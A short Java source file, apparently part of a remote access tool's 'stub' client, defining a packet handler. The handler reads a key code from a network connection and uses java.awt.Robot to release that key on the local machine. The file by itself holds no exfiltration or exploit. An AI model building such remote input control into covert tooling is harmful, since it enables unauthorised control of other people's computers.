package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class Packet95KeyRelease extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int btn = Connection.readInt();
		Main.robot.keyRelease(btn);
	}

}